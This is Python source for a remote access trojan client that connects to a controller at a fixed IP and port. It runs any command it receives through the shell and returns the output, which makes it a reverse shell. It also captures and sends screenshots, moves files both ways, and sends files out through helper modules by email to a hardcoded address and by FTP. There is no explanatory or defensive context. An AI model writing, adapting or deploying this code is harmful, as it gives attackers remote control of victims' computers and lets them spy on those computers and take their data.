# coding=utf-8
import socket
from subprocess import Popen, PIPE
import screenshot
import getfile_email
import getfile_ftp
import os
import time 
import struct
import json
import subprocess

target_host = "192.168.241.133"
target_port = 9999

client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((target_host,target_port))
download_dir = os.getcwd()
def recccc():
    obj = client.recv(4)
    header_size = struct.unpack('i', obj)[0]
    header_bytes = client.recv(header_size)
    header_json = header_bytes.decode('utf-8')
    header_dic = json.loads(header_json)
    print(header_dic)
    total_size = header_dic['file_size']
    file_name = header_dic['filename']
    with open('%s/%s' % (download_dir, file_name), 'wb') as f:
        recv_size = 0
        while recv_size < total_size:
            res = client.recv(1024)
            f.write(res)
            recv_size += len(res)
            print('总大小：%s  已经下载大小：%s' % (total_size, recv_size))

def send_win(share_dir,filename):
    
    header_dic = {
        'filename': filename,
        'file_size': os.path.getsize(r'%s/%s' % (share_dir, filename)) 
    }
    header_json = json.dumps(header_dic)
    header_bytes = header_json.encode('utf-8')
    client.send(struct.pack('i', len(header_bytes)))
    client.send(header_bytes)
    with open('%s/%s' % (share_dir, filename), 'rb') as f:
        for a in f:
            client.send(a)

def send_lin(share_dir,filename):
    header_dic = {
        'filename': filename,
        'file_size': os.path.getsize(r'%s/%s' % (share_dir, filename)) 
    }
    header_json = json.dumps(header_dic)
    header_bytes = header_json.encode('utf-8')
    client.send(struct.pack('i', len(header_bytes)))
    client.send(header_bytes)
    with open('%s/%s' % (share_dir, filename), 'rb') as f:
        for a in f:
            client.send(a)

if os.name == "posix":
    while True:
        data = client.recv(1024)
        if data == "screen":
            proc = Popen("import -window /usr screenshot.jpg", shell=True,stdout=PIPE,stderr=PIPE, stdin=PIPE)
            share_dir = "/usr"
            filename = "screenshot.jpg"
            send_lin(share_dir,filename)
        elif data == "sendmail":
            getfile_email.geeet("yh18569437207@163.com")
            client.send(b"success")
        elif data == "sendftp":
            getfile_ftp.geeet(target_host)
            client.send(b"success")
        elif data == "upload":
            # client.send(b"please input filename:")
            recccc()
        elif data == "download":
            ff = client.recv(1024).decode()
            bb = client.recv(1024).decode()
            send_lin(ff,bb)
        elif data == "quit": break
        else:
            proc = Popen(data, shell=True,stdout=PIPE,stderr=PIPE, stdin=PIPE)
            proc = proc.stdout.read() + proc.stderr.read()
            client.send(proc)
    client.close()

elif os.name == "nt":
    while True:
        data = client.recv(1024).decode()

        if data == "screen":
            screenshot.shot()
            share_dir = r'C:\Windows\Temp'
            filename = "screenshot.bmp"
            send_win(share_dir,filename)
        elif data == "sendmail":
            getfile_email.geeet("yh18569437207@163.com")
            client.send(b"success")
        elif data == "sendftp":
            getfile_ftp.geeet(target_host)
            client.send(b"success")
        elif data == "quit": break
        elif data == "upload":
            # client.send(b"please input filename:")
            recccc()
        elif data == "download":
            ff = client.recv(1024).decode()
            bb = client.recv(1024).decode()
            send_win(ff,bb)
        else:
            # proc = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # proc = proc.stdout.read() + proc.stderr.read()
            proc = os.popen(data).read()
            client.send(proc.encode())
    client.close()
